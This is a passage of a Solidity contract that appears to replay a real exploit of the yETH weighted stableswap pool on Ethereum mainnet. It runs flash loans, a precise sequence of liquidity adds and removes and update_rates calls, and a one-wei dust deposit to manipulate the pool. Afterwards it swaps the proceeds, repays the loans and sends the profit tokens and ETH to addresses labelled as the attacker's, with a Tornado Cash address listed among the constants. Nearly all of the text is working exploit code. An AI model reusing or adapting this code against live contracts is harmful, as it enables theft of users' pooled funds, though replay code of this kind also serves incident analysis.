                    1526051744772289698092,
                    1038108768586660585581,
                    0,
                    969651157511131341121,
                    1363135138655820584263,
                    0,
                    0
                ),
                0
            );
        _setPhase(0, 57);
        IyETH_weighted_stableswap_pool(Addresses.yETH_weighted_stableswap_pool)
            .remove_liquidity(7066638371690257003757, _uintArray8(0, 0, 0, 0, 0, 0, 0, 0));
    }

    function _addYethLiq2() internal {
        _setPhase(0, 58);
        IyETH_weighted_stableswap_pool(Addresses.yETH_weighted_stableswap_pool)
            .add_liquidity(
                _uintArray8(
                    859805263416698094503,
                    804573178584505833740,
                    546933182262586953508,
                    0,
                    510865922059584325991,
                    723182384178548055243,
                    0,
                    0
                ),
                0
            );
        _setPhase(0, 59);
    }

    function _churnYethLiq3() internal {
        IyETH_weighted_stableswap_pool(Addresses.yETH_weighted_stableswap_pool)
            .remove_liquidity(3496158478994807127953, _uintArray8(0, 0, 0, 0, 0, 0, 0, 0));
        _setPhase(0, 60);
        IyETH_weighted_stableswap_pool(Addresses.yETH_weighted_stableswap_pool)
            .add_liquidity(
                _uintArray8(
                    1784169320136805803209,
                    1669558029141448703194,
                    1135991585797559066395,
                    0,
                    1061079136814511050837,
                    1488254960317842892500,
                    0,
                    0
                ),
                0,
                address(this)
            );
    }

    function _addYethLiq3() internal {
        _setPhase(0, 61);
        IyETH_weighted_stableswap_pool(Addresses.yETH_weighted_stableswap_pool)
            .add_liquidity(_uintArray8(0, 0, 0, 20605468750000000000, 0, 0, 0, 0), 0, address(this));
    }

    function _removeYethZero1() internal {
        _setPhase(0, 62);
        IyETH_weighted_stableswap_pool(Addresses.yETH_weighted_stableswap_pool)
            .remove_liquidity(0, _uintArray8(0, 0, 0, 0, 0, 0, 0, 0));
        _setPhase(0, 63);
    }

    function _updateRates6a() internal {
        IyETH_weighted_stableswap_pool(Addresses.yETH_weighted_stableswap_pool).update_rates(_uintArray1(6));
        _setPhase(0, 64);
        IyETH_weighted_stableswap_pool(Addresses.yETH_weighted_stableswap_pool)
            .remove_liquidity(8434932236461542896540, _uintArray8(0, 0, 0, 0, 0, 0, 0, 0));
    }

    function _rebaseOeth() internal {
        _setPhase(0, 65);
        IOETHVaultProxy(Addresses.OETHVaultProxy).rebase();
        _setPhase(0, 66);
    }

    function _addYethLiq4() internal {
        IyETH_weighted_stableswap_pool(Addresses.yETH_weighted_stableswap_pool)
            .add_liquidity(
                _uintArray8(
                    1049508928999413985639,
                    982090679001395746930,
                    667668088369153429906,
                    0,
                    623639019639346230238,
                    878771594643399886538,
                    0,
                    0
                ),
                0,
                address(this)
            );
        _setPhase(0, 67);
    }

    function _addYethLiq5() internal {
        IyETH_weighted_stableswap_pool(Addresses.yETH_weighted_stableswap_pool)
            .add_liquidity(
                _uintArray8(
                    919888612738016815095,
                    860796899699397749576,
                    586033288771470394081,
                    0,
                    547387589810030997702,
                    763397793689173373329,
                    0,
                    0
                ),
                0,
                address(this)
            );
        _setPhase(0, 68);
        IyETH_weighted_stableswap_pool(Addresses.yETH_weighted_stableswap_pool)
            .add_liquidity(_uintArray8(0, 0, 0, 57226562500000000000, 0, 0, 0, 0), 0, address(this));
    }

    function _removeYethZero2() internal {
        _setPhase(0, 69);
        IyETH_weighted_stableswap_pool(Addresses.yETH_weighted_stableswap_pool)
            .remove_liquidity(0, _uintArray8(0, 0, 0, 0, 0, 0, 0, 0));
        _setPhase(0, 70);
    }

    function _updateRates6b() internal {
        IyETH_weighted_stableswap_pool(Addresses.yETH_weighted_stableswap_pool).update_rates(_uintArray1(6));
        _setPhase(0, 71);
        IyETH_weighted_stableswap_pool(Addresses.yETH_weighted_stableswap_pool)
            .remove_liquidity(9237030802829017297880, _uintArray8(0, 0, 0, 0, 0, 0, 0, 0));
    }

    function _addYethLiqChild1() internal {
        _setPhase(0, 72);
        IyETH_weighted_stableswap_pool(Addresses.yETH_weighted_stableswap_pool)
            .add_liquidity(
                _uintArray8(
                    417517891458429416749,
                    390697418752374378114,
                    264940493241640253533,
                    0,
                    247469112791605057921,
                    355235146731093304055,
                    0,
                    0
                ),
                0,
                Addresses.attack_child_1F8E
            );
    }

    function _addYethLiqChild2() internal {
        _setPhase(0, 73);
        IyETH_weighted_stableswap_pool(Addresses.yETH_weighted_stableswap_pool)
            .add_liquidity(
                _uintArray8(
                    1779325564746959656328,
                    1665025426427657662239,
                    1133554647882989836457,
                    0,
                    1058802901663485490031,
                    1476627921656231103547,
                    0,
                    0
                ),
                0,
                Addresses.attack_child_1F8E
            );
        _setPhase(0, 74);
    }

    function _churnChildYeth() internal {
        IyETH_weighted_stableswap_pool(Addresses.yETH_weighted_stableswap_pool)
            .add_liquidity(_uintArray8(0, 0, 0, 318750000000000000000, 0, 0, 0, 0), 0, Addresses.attack_child_1F8E);
        _setPhase(0, 75);
        IyETH_weighted_stableswap_pool(Addresses.yETH_weighted_stableswap_pool)
            .remove_liquidity(0, _uintArray8(0, 0, 0, 0, 0, 0, 0, 0));
    }

    function _updateRates7() internal {
        _setPhase(0, 76);
        IyETH_weighted_stableswap_pool(Addresses.yETH_weighted_stableswap_pool).update_rates(_uintArray1(7));
        _setPhase(0, 77);
    }

    function startSecondLoan() internal {
        OurAttack(payable(Addresses.attack_contract)).startSecondChildLoan();
    }

    function acceptFlashLoan() public {}

    function acceptFlashLoan2() public {}

    function flashCallback2() public {
        _collectChildTokens1();
        _collectChildTokens2();
        _collectChildTokens3();
        _collectChildTokens4();
        _collectChildTokens5();
        _collectChildTokens6();
        _collectChildTokens7();
        _collectChildTokens8();
        _removeAllYethLiq();
        _approveDustSet1();
        _approveDustSet2();
        _approveDustSet3();
        _approveDustSet4();
        _addDustLiquidity();
        _swapYethToVault();
        _repayAaveLoan();
        _redeemWOeth();
        _swapOethToWeth();
        _swapMethToWeth();
        _repayRethCbeth();
        _swapCbethToWeth();
        _swapEthxToWsteth();
        _redeemSfrxEth();
        _redeemApxEth();
        _swapPxEthToWeth();
        _wrapStethRepay();
        _unwrapWstethProfit();
        _swapStethForWeth();
        _redeemPirexEth();
        _repayWethVault();
        _sendCbethProfit();
        _sendRethProfit();
        _sendWstethDust();
        _sendApxEthDust();
        _sendEthxMethDust();
        _sendFrxEthProfit();
        _unwrapWethProfit();
        _sendStethEthProfit();
    }

    function _collectChildTokens1() internal {
        uint256 childSfrxEth = IERC20Like(Addresses.sfrxETH).balanceOf(Addresses.attack_child);
        IERC20Like(Addresses.sfrxETH).transferFrom(Addresses.attack_child, address(this), childSfrxEth);
        IERC20Like(Addresses.cbETH).balanceOf(Addresses.attack_child);
    }

    function _collectChildTokens2() internal {
        IERC20Like(Addresses.cbETH).transferFrom(Addresses.attack_child, address(this), 156606088305762216334);
        uint256 childReth = IERC20Like(Addresses.rETH).balanceOf(Addresses.attack_child);
        IERC20Like(Addresses.rETH).transferFrom(Addresses.attack_child, address(this), childReth);
    }

    function _collectChildTokens3() internal {
        uint256 childWOeth = IERC20Like(Addresses.wOETH_8192).balanceOf(Addresses.attack_child);
        IERC20Like(Addresses.wOETH_8192).transferFrom(Addresses.attack_child, address(this), childWOeth);
        IERC20Like(Addresses.wstETH).balanceOf(Addresses.attack_child);
    }

    function _collectChildTokens4() internal {
        IERC20Like(Addresses.wstETH)
            .transferFrom(Addresses.attack_child, address(this), 1170568705094694025437);
        uint256 childApxEth = IERC20Like(Addresses.apxETH).balanceOf(Addresses.attack_child);
        IERC20Like(Addresses.apxETH).transferFrom(Addresses.attack_child, address(this), childApxEth);
        IERC20Like(Addresses.ETHx_A15B).balanceOf(Addresses.attack_child);
    }

    function _collectChildTokens5() internal {
        IERC20Like(Addresses.ETHx_A15B)
            .transferFrom(Addresses.attack_child, address(this), 713944128055121858482);
        uint256 childMeth = IERC20Like(Addresses.mETH).balanceOf(Addresses.attack_child);
        IERC20Like(Addresses.mETH).transferFrom(Addresses.attack_child, address(this), childMeth);
    }

    function _collectChildTokens6() internal {
        uint256 childFrxEth = IERC20Like(Addresses.frxETH).balanceOf(Addresses.attack_child);
        IERC20Like(Addresses.frxETH).transferFrom(Addresses.attack_child, address(this), childFrxEth);
        IERC20Like(Addresses.pxETH).balanceOf(Addresses.attack_child);
    }

    function _collectChildTokens7() internal {
        IERC20Like(Addresses.pxETH).transferFrom(Addresses.attack_child, address(this), 7722832330628178326);
        uint256 childWeth = IERC20Like(Addresses.WETH).balanceOf(Addresses.attack_child);
        IERC20Like(Addresses.WETH).transferFrom(Addresses.attack_child, address(this), childWeth);
        IERC20Like(Addresses.stETH_FE84).balanceOf(Addresses.attack_child);
    }

    function _collectChildTokens8() internal {
        IERC20Like(Addresses.stETH_FE84)
            .transferFrom(Addresses.attack_child, address(this), 391526493812251144585);
        IyETH_weighted_stableswap_pool(Addresses.yETH_weighted_stableswap_pool).supply();
    }

    function _removeAllYethLiq() internal {
        uint256 removeAmount = 10103234676976610812397;
        IyETH_weighted_stableswap_pool(Addresses.yETH_weighted_stableswap_pool)
            .remove_liquidity(removeAmount, _uintArray8(0, 0, 0, 0, 0, 0, 0, 0));
    }

    function _approveDustSet1() internal {
        uint256 sfrxEthAllowance = 1;
        IERC20Like(Addresses.sfrxETH).approve(Addresses.yETH_weighted_stableswap_pool, sfrxEthAllowance);
        uint256 cbEthAllowance = 1;
        IERC20Like(Addresses.cbETH).approve(Addresses.yETH_weighted_stableswap_pool, cbEthAllowance);
    }

    function _approveDustSet2() internal {
        uint256 rEthAllowance = 1;
        IERC20Like(Addresses.rETH).approve(Addresses.yETH_weighted_stableswap_pool, rEthAllowance);
        uint256 wOethAllowance = 1;
        IERC20Like(Addresses.wOETH_8192).approve(Addresses.yETH_weighted_stableswap_pool, wOethAllowance);
    }

    function _approveDustSet3() internal {
        uint256 wstEthAllowance = 1;
        IERC20Like(Addresses.wstETH).approve(Addresses.yETH_weighted_stableswap_pool, wstEthAllowance);
        uint256 apxEthAllowance = 1;
        IERC20Like(Addresses.apxETH).approve(Addresses.yETH_weighted_stableswap_pool, apxEthAllowance);
    }

    function _approveDustSet4() internal {
        uint256 ethxAllowance = 1;
        IERC20Like(Addresses.ETHx_A15B).approve(Addresses.yETH_weighted_stableswap_pool, ethxAllowance);
        uint256 methAllowance = 9;
        IERC20Like(Addresses.mETH).approve(Addresses.yETH_weighted_stableswap_pool, methAllowance);
    }

    function _addDustLiquidity() internal {
        IyETH_weighted_stableswap_pool(Addresses.yETH_weighted_stableswap_pool)
            .add_liquidity(_uintArray8(1, 1, 1, 1, 1, 1, 1, 9), 0);
    }

    function _swapYethToVault() internal {
        IERC20Like(Addresses.yETH).approve(Addresses.yETH_f, 100001000000000000000000000000000000);
        IyETH_f(Addresses.yETH_f)
            .exchange(
                int128(1),
                int128(0),
                100000000000000000000000000000,
                1000000000000000000000,
                Addresses.Vault_BA1222
            );
        IyETH_f(Addresses.yETH_f)
            .exchange(int128(1), int128(0), 100000000000000000000000000000000000, 0, Addresses.Vault_BA1222);
    }

    function _repayAaveLoan() internal {
        IERC20Like(Addresses.ETHx_A15B).transfer(Addresses.attack_child, 2001000000000000000000);
        IERC20Like(Addresses.rETH).transfer(Addresses.attack_child, 1500750000000000000000);
        IERC20Like(Addresses.cbETH).transfer(Addresses.attack_child, 200100000000000000000);
        IERC20Like(Addresses.wOETH_8192).balanceOf(address(this));
    }

    function _redeemWOeth() internal {
        uint256 redeemShares = 50542841971854161903;
        IwOETH_8192(Addresses.wOETH_8192).redeem(redeemShares, address(this), address(this));
        IERC20Like(Addresses.OETH).balanceOf(address(this));
        uint256 oethSwapAllowance = 57885258099812245857;
        IERC20Like(Addresses.OETH).approve(Addresses.OETH_WETH, oethSwapAllowance);
    }

    function _swapOethToWeth() internal {
        IERC20Like(Addresses.OETH).balanceOf(address(this));
        uint256 exchangeAmount = 57885258099812245857;
        IOETH_WETH(Addresses.OETH_WETH)
            .exchange(int128(0), int128(1), exchangeAmount, 0, Addresses.Vault_BA1222);
        IERC20Like(Addresses.mETH).balanceOf(address(this));
    }

    function _swapMethToWeth() internal {
        uint256 methSwapAllowance = 51389053609897701308;
        IERC20Like(Addresses.mETH).approve(Addresses.SwapRouter, methSwapAllowance);
        IERC20Like(Addresses.mETH).balanceOf(address(this));
        uint256 swapAmt = 51389053609897701308;
        ISwapRouter(Addresses.SwapRouter)
            .exactInputSingle(
                Abi_exactInputSingle_Param0({
                    field0: Addresses.mETH,
                    field1: Addresses.WETH,
                    field2: 500,
                    field3: Addresses.Vault_BA1222,
                    field4: 1764537119,
                    field5: swapAmt,
                    field6: 50,
                    field7: 0
                })
            );
    }

    function _repayRethCbeth() internal {
        uint256 rEthRepayment = 300000000000000000000;
        IERC20Like(Addresses.rETH).transfer(Addresses.Vault_BA1222, rEthRepayment);
        IERC20Like(Addresses.cbETH).approve(Addresses.SwapRouter, 230000000000000000000);
    }

    function _swapCbethToWeth() internal {
        uint256 swapAmt = 230000000000000000000;
        ISwapRouter(Addresses.SwapRouter)
            .exactInputSingle(
                Abi_exactInputSingle_Param0({
                    field0: Addresses.cbETH,
                    field1: Addresses.WETH,
                    field2: 500,
                    field3: Addresses.Vault_BA1222,
                    field4: 1764537119,
                    field5: swapAmt,
                    field6: 0,
                    field7: 75364347830767020784054125655
                })
            );
        IERC20Like(Addresses.ETHx_A15B).balanceOf(address(this));
        uint256 ethxSwapAllowance = 202169624055563120824;
        IERC20Like(Addresses.ETHx_A15B).approve(Addresses.SwapRouter, ethxSwapAllowance);
    }

    function _swapEthxToWsteth() internal {
        IERC20Like(Addresses.ETHx_A15B).balanceOf(address(this));
        uint256 swapAmt = 202169624055563120824;
        ISwapRouter(Addresses.SwapRouter)
            .exactInputSingle(
                Abi_exactInputSingle_Param0({
                    field0: Addresses.ETHx_A15B,
                    field1: Addresses.wstETH,
                    field2: 100,
                    field3: Addresses.attack_child_1F8E,
                    field4: 1764537119,
                    field5: swapAmt,
                    field6: 0,
                    field7: 89776708723587163891445672585
                })
            );
        IERC20Like(Addresses.sfrxETH).balanceOf(address(this));
    }

    function _redeemSfrxEth() internal {
        uint256 redeemShares = 2610948378862343741658;
        IsfrxETH(Addresses.sfrxETH).redeem(redeemShares, address(this), address(this));
        IERC20Like(Addresses.frxETH).approve(Addresses.st_frxETH_f, 2300000000000000000000);
        Ist_frxETH_f(Addresses.st_frxETH_f)
            .exchange(int128(1), int128(0), 2300000000000000000000, 2285000000000000000000, address(this));
        IERC20Like(Addresses.apxETH).balanceOf(address(this));
    }

    function _redeemApxEth() internal {
        uint256 redeemShares = 1996921207976303190114;
        IapxETH(Addresses.apxETH).redeem(redeemShares, address(this), address(this));
        IERC20Like(Addresses.pxETH).approve(Addresses.pxsteth, 370000000000000000000);
        IERC20Like(Addresses.pxETH).approve(Addresses.pxethweth, 510000000000000000000);
        Ipxsteth(Addresses.pxsteth)
            .exchange(int128(0), int128(1), 370000000000000000000, 368000000000000000000, address(this));
    }

    function _swapPxEthToWeth() internal {
        Ipxethweth(Addresses.pxethweth)
            .exchange(int128(1), int128(0), 510000000000000000000, 508000000000000000000, Addresses.Vault_BA1222);
        IERC20Like(Addresses.stETH_FE84).balanceOf(address(this));
    }

    function _wrapStethRepay() internal {
        uint256 stEthWrapAllowance = 3049870304671366673436;
        IERC20Like(Addresses.stETH_FE84).approve(Addresses.wstETH, stEthWrapAllowance);
        uint256 stEthBalance = IERC20Like(Addresses.stETH_FE84).balanceOf(address(this));
        IwstETH(Addresses.wstETH).wrap(stEthBalance);
        IERC20Like(Addresses.wstETH).transfer(Addresses.Vault_BA1222, 4000000000000000000000);
    }

    function _unwrapWstethProfit() internal {
        IERC20Like(Addresses.wstETH).transfer(Addresses.attack_child, 1500750000000000000000);
        IERC20Like(Addresses.wstETH).balanceOf(address(this));
        uint256 unwrapAmount = 535633871304755056822;
        IwstETH(Addresses.wstETH).unwrap(unwrapAmount);
        IERC20Like(Addresses.stETH_FE84).balanceOf(address(this));
    }

    function _swapStethForWeth() internal {
        uint256 stEthSwapAllowance = 653800379707872703125;
        IERC20Like(Addresses.stETH_FE84).approve(Addresses.Proxy_85B78A, stEthSwapAllowance);
        IERC20Like(Addresses.WETH).balanceOf(Addresses.Proxy_85B78A);
        IProxy_85B78A(Addresses.Proxy_85B78A)
            .swapTokensForExactTokens(
                Addresses.stETH_FE84,
                Addresses.WETH,
                485906566732579858361,
                600000000000000000000,
                address(this)
            );
        IPirexEth(Addresses.PirexEth).buffer();
    }

    function _redeemPirexEth() internal {
        uint256 redeemAmount = 469007825917036299227;
        IPirexEth(Addresses.PirexEth).instantRedeemWithPxEth(redeemAmount, address(this));
        uint256 depositAmount = address(this).balance;
        if (depositAmount > 466662786787451117731) depositAmount = 466662786787451117731;
        if (depositAmount != 0) IWETH(Addresses.WETH).deposit{value: depositAmount}();
        IERC20Like(Addresses.WETH).balanceOf(address(this));
    }

    function _repayWethVault() internal {
        uint256 wethRepayment = 1124419506842153209747;
        IERC20Like(Addresses.WETH).transfer(Addresses.Vault_BA1222, wethRepayment);
        IERC20Like(Addresses.sfrxETH).balanceOf(address(this));
        IERC20Like(Addresses.sfrxETH).transfer(Addresses.A_A80D3F_C822, 0);
    }

    function _sendCbethProfit() internal {
        uint256 cbEthBalance = IERC20Like(Addresses.cbETH).balanceOf(address(this));
        IERC20Like(Addresses.cbETH).transfer(Addresses.A_A80D3F_C822, cbEthBalance);
        IERC20Like(Addresses.rETH).balanceOf(address(this));
    }

    function _sendRethProfit() internal {
        uint256 rEthProfit = 203552160863078446817;
        IERC20Like(Addresses.rETH).transfer(Addresses.A_A80D3F_C822, rEthProfit);
        IERC20Like(Addresses.wOETH_8192).balanceOf(address(this));
        IERC20Like(Addresses.wOETH_8192).transfer(Addresses.A_A80D3F_C822, 0);
    }

    function _sendWstethDust() internal {
        IERC20Like(Addresses.wstETH).balanceOf(address(this));
        IERC20Like(Addresses.wstETH).transfer(Addresses.A_A80D3F_C822, 0);
    }

    function _sendApxEthDust() internal {
        IERC20Like(Addresses.apxETH).balanceOf(address(this));
        IERC20Like(Addresses.apxETH).transfer(Addresses.A_A80D3F_C822, 0);
        IERC20Like(Addresses.ETHx_A15B).balanceOf(address(this));
    }

    function _sendEthxMethDust() internal {
        IERC20Like(Addresses.ETHx_A15B).transfer(Addresses.A_A80D3F_C822, 0);
        IERC20Like(Addresses.mETH).balanceOf(address(this));
        IERC20Like(Addresses.mETH).transfer(Addresses.A_A80D3F_C822, 0);
    }

    function _sendFrxEthProfit() internal {
        uint256 frxEthBalance = IERC20Like(Addresses.frxETH).balanceOf(address(this));
        IERC20Like(Addresses.frxETH).transfer(Addresses.A_A80D3F_C822, frxEthBalance);
        IERC20Like(Addresses.pxETH).balanceOf(address(this));
    }

    function _unwrapWethProfit() internal {
        uint256 pxEthProfit = 857489624503896244971;
        IERC20Like(Addresses.pxETH).transfer(Addresses.A_A80D3F_C822, pxEthProfit);
        uint256 wethBalance = IERC20Like(Addresses.WETH).balanceOf(address(this));
        IWETH(Addresses.WETH).withdraw(wethBalance);
    }

    function _sendStethEthProfit() internal {
        uint256 stEthBalance = IERC20Like(Addresses.stETH_FE84).balanceOf(address(this));
        IERC20Like(Addresses.stETH_FE84).transfer(Addresses.A_A80D3F_C822, stEthBalance);
        uint256 nativeTransferAmount = address(this).balance;
        if (nativeTransferAmount > 100000000000000000) nativeTransferAmount = 100000000000000000;
        (bool nativeOk,) = payable(Addresses.A_DADB0D_3711).call{value: nativeTransferAmount}("");
        if (!nativeOk) {

        }
        if (address(this).balance > 0) {
            (bool ok,) = payable(Addresses.A_A80D3F_C822).call{value: address(this).balance}("");
            require(ok, "selfdestruct beneficiary transfer failed");
        }
    }
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant A_000000_0004 = 0x0000000000000000000000000000000000000004;
    address internal constant UniswapV3Pool = 0x04708077eCa6bb527a5BBbD6358ffb043a9c1C14;
    address internal constant pxETH = 0x04C154b66CB340F3Ae24111CC767e0184Ed00Cc6;
    address internal constant METH = 0x052F52748109BAE13D6319A463D64B6a2A613e52;
    address internal constant InitializableImmutableAdminUpgradeabilityProxy_0B925E =
        0x0B925eD163218f6662a35e0f0371Ac234f9E9371;
    address internal constant attack_contract = 0x12d0B1025B9ED926775e01F6A463f2702971C664;
    address internal constant stETH = 0x17144556fd3424EDC8Fc8A4C940B2D04936d17eb;
    address internal constant PirexFees = 0x177D685384AA1Ac5ABA41b7E649F9fA0Be717fdb;
    address internal constant ConvexEthMetaStrategyProxy = 0x1827F9eA98E0bf96550b2FC20F7233277FcD7E63;
    address internal constant yETH = 0x1BED97CBC3c24A4fb5C069C6E311a967386131f7;
    address internal constant InitializableImmutableAdminUpgradeabilityProxy_1C0E06 =
        0x1c0E06a0b1A4c160c17545FF2A951bfcA57C0002;
    address internal constant BaseRewardPool = 0x24b65DC1cf053A8D96872c323d29e86ec43eB33A;
    address internal constant StakedTokenV1 = 0x31724cA0C982A31fbb5C57f4217AB585271fc9a5;
    address internal constant OETH_WETH_gauge = 0x36cC1d791704445A5b6b9c36a667e511d4702F3f;
    address internal constant wOETH = 0x388782b21275F75255f3ee08e23Bd3991d4eB830;
    address internal constant OETHVaultProxy = 0x39254033945AA2E4809Cc2977E7087BEE48bd7Ab;
    address internal constant attack_child = 0x3e8e7533dcf69c698Cf806C3DB22f7f10B9B0b97;
    address internal constant NativeStakingSSVStrategy2Proxy = 0x4685dB8bF2Df743c861d71E6cFb5347222992076;
    address internal constant ETHx = 0x4C22fFd479637EA0eD61D451CBe6355627283358;
    address internal constant st_frxETH_f = 0x4d9f9D15101EEC665F77210cB999639f760F831E;
    address internal constant yETH_staking_contract = 0x583019fF0f430721aDa9cfb4fac8F06cA104d0B4;
    address internal constant frxETH = 0x5E8422345238F34275888049021821E8E08CAa1f;
    address internal constant pxsteth = 0x6951bDC4734b9f7F3E1B74afeBC670c736A0EDB6;
    address internal constant yETH_f = 0x69ACcb968B19a53790f43e57558F5E443A91aF22;
    address internal constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address internal constant A_83584F_28FE = 0x83584f83f26aF4eDDA9CBe8C730bc87C364b28fe;
    address internal constant UniswapV3Pool_4410 = 0x840DEEef2f115Cf50DA625F7368C24af6fE74410;
    address internal constant OETH = 0x856c4Efb76C1D1AE02e20CEB03A2A6a08b0b8dC3;
    address internal constant Proxy_85B78A = 0x85B78AcA6Deae198fBF201c82DAF6Ca21942acc6;
    address internal constant InitializableImmutableAdminUpgradeabilityProxy_87870B =
        0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;
    address internal constant A_977B6F_B78C = 0x977b6fc5dE62598B08C85AC8Cf2b745874E8b78c;
    address internal constant apxETH = 0x9Ba021B0a9b958B5E75cE9f6dff97C7eE52cb3E6;
    address internal constant A_9C3B46_31BC = 0x9c3B46C0Ceb5B9e304FCd6D88Fc50f7DD24B31Bc;
    address internal constant ValidatorQueue = 0x9E0d7D79735e1c63333128149c7b616a0dC0bBDb;
    address internal constant TornadoCash_eth = 0xA160cdAB225685dA1d56aa342Ad8841c3b53f291;
    address internal constant ETHx_A15B = 0xA35b1B31Ce002FBF2058D22F30f95D405200A15b;
    address internal constant GnosisSafeProxy = 0xA52Fd396891E7A74b641a2Cb1A6999Fcf56B077e;
    address internal constant A_A80D3F_C822 = 0xa80D3F2022F6Bfd0B260bF16D72CaD025440C822;
    address internal constant sfrxETH = 0xac3E018457B222d93114458476f3E3416Abbe38F;
    address internal constant attack_child_1F8E = 0xADbE952eBB9b3e247261d2E3b96835f00f721f8E;
    address internal constant rETH = 0xae78736Cd615f374D3085123A210448E74Fc6393;
    address internal constant stETH_FE84 = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;
    address internal constant OETHCurveAMOProxy = 0xaF04828Ed923216c77dC22a2fc8E077FDaDAA87d;
    address internal constant OETHCurveAMOProxy_3FE6 = 0xba0e352AB5c13861C26e4E773e7a833C3A223FE6;
    address internal constant Vault_BA1222 = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant SafeProxy = 0xBB077E716A5f1F1B63ed5244eBFf5214E50fec8c;
    address internal constant attack_contract_3F73 = 0xbb2789b418fA18f9526bA79fa7038d4e6d753f73;
    address internal constant cbETH = 0xBe9895146f7AF43049ca1c1AE358B0541Ea49704;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant pxethweth = 0xC8Eb2Cf2f792F77AF0Cd9e203305a585E588179D;
    address internal constant A_C9ED5D_FAA1 = 0xC9eD5de354D4BE9fd576D3108C7637a71C01faA1;
    address internal constant OETH_WETH = 0xcc7d5785AD5755B6164e21495E07aDb0Ff11C2A8;
    address internal constant InitializableImmutableAdminUpgradeabilityProxy_CC9EE9 =
        0xCc9EE9483f662091a1de4795249E24aC0aC2630f;
    address internal constant yETH_weighted_stableswap_pool = 0xCcd04073f4BdC4510927ea9Ba350875C3c65BF81;
    address internal constant A_D31D3E_12C4 = 0xd31d3e1F60552ba8B35aA3Bd17c949404fdd12c4;
    address internal constant mETH = 0xd5F7838F5C461fefF7FE49ea5ebaF7728bB0ADfa;
    address internal constant PirexEth = 0xD664b74274DfEB538d9baC494F3a4760828B02b0;
    address internal constant OETH_2033 = 0xD86756dBb01e75A11AaDaCB75c8495759ED92033;
    address internal constant A_DADB0D_3711 = 0xdadB0d80178819F2319190D340ce9A924f783711;
    address internal constant wOETH_8192 = 0xDcEe70654261AF21C44c093C300eD3Bb97b78192;
    address internal constant SwapRouter = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
    address internal constant NativeStakingSSVStrategy3Proxy = 0xE98538A0e8C2871C2482e1Be8cC6bd9F8E8fFD63;
    address internal constant attacker_eoa = 0xFb63aa935Cf0a003335dCE9Cca03c4F9c0fa4779;
    address internal constant A_FFFFFF_FFFF = 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF;
}

struct Abi_exactInputSingle_Param0 {
    address field0;
    address field1;
    uint24 field2;
    address field3;
    uint256 field4;
    uint256 field5;
    uint256 field6;
    uint160 field7;
}

interface IInitializableImmutableAdminUpgradeabilityProxy_87870B {
    function flashLoan(
        address,
        address[] calldata,
        uint256[] calldata,
        uint256[] calldata,
        address,
        bytes calldata,
        uint16
    ) external;
}

interface IOETHVaultProxy {
    function rebase() external;
}

interface IOETH_WETH {
    function exchange(int128, int128, uint256, uint256, address) external returns (uint256);
}

interface IPirexEth {
    function buffer() external view returns (uint256);
    function deposit(address, bool) external payable;
    function instantRedeemWithPxEth(uint256, address) external;
}

interface IProxy_85B78A {
    function swapTokensForExactTokens(address, address, uint256, uint256, address) external;
}

interface ISwapRouter {
    function exactInputSingle(Abi_exactInputSingle_Param0 calldata) external returns (uint256);
}

interface ITornadoCash_eth {
    function deposit(bytes32) external payable;
    function withdraw(bytes calldata, bytes32, bytes32, address, address, uint256, uint256) external;
}

interface IVault_BA1222 {
    function flashLoan(address, address[] calldata, uint256[] calldata, bytes calldata) external;
}

interface IWETH {
    function deposit() external payable;
    function withdraw(uint256) external;
}

interface IapxETH {
    function deposit(uint256, address) external returns (uint256);
    function redeem(uint256, address, address) external returns (uint256);
}

interface Ipxethweth {
    function exchange(int128, int128, uint256, uint256) external returns (uint256);
    function exchange(int128, int128, uint256, uint256, address) external returns (uint256);
}

interface Ipxsteth {
    function exchange(int128, int128, uint256, uint256) external returns (uint256);
    function exchange(int128, int128, uint256, uint256, address) external returns (uint256);
}

interface IsfrxETH {
    function deposit(uint256, address) external returns (uint256);
    function redeem(uint256, address, address) external returns (uint256);
}

interface Ist_frxETH_f {
    function exchange(int128, int128, uint256, uint256) external returns (uint256);
    function exchange(int128, int128, uint256, uint256, address) external returns (uint256);
}

interface IwOETH_8192 {
    function redeem(uint256, address, address) external returns (uint256);
}

interface IwstETH {
    function unwrap(uint256) external returns (uint256);
    function wrap(uint256) external returns (uint256);
}

interface IyETH_f {
    function exchange(int128, int128, uint256, uint256) external returns (uint256);
    function exchange(int128, int128, uint256, uint256, address) external returns (uint256);
}

interface IyETH_weighted_stableswap_pool {
    function add_liquidity(uint256[] calldata, uint256) external returns (uint256);
    function add_liquidity(uint256[] calldata, uint256, address) external returns (uint256);
    function remove_liquidity(uint256, uint256[] calldata) external;
    function supply() external view returns (uint256);
    function update_rates(uint256[] calldata) external;
}

library Harness {
    function safeBalance(address token, address account) internal view returns (uint256) {
        if (token.code.length == 0) return 0;
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSignature("balanceOf(address)", account));
        if (!ok || data.length < 32) return 0;
        return abi.decode(data, (uint256));
    }
}
